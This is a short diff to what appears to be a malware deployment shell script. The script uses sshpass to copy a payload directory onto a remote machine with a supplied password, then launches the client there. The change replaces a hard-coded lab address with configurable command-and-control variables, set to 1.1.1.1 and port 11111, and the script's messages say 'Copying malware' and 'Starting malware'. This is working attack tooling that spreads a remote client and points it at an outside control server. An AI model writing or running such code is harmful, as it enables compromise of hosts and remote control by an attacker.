@@ -17,6 +17,9 @@ port="22"
 PAYLOAD="./client/"
 CLIENT_EXE="client/run.py"
 
+CNC_IP="1.1.1.1"
+CNC_PORT="11111"
+
 # ------------------
 # -- Send Payload --
 # ------------------
@@ -37,7 +40,7 @@ function sendPayload() {
 	echo "Copying malware... " 
 	sshpass -p "$4" scp -P ${2} -r "$PAYLOAD" "${3}@${1}:/home/${3}"
 	echo "Starting malware... " 
-	sshpass -p "$4" ssh -P "${3}@${1}" python3 "/home/${3}/${CLIENT_EXE}" 192.168.56.1 11111
+	sshpass -p "$4" ssh -P "${3}@${1}" python3 "/home/${3}/${CLIENT_EXE}" "${CNC_IP}" "${CNC_PORT}"
 }
 
 # -------------------
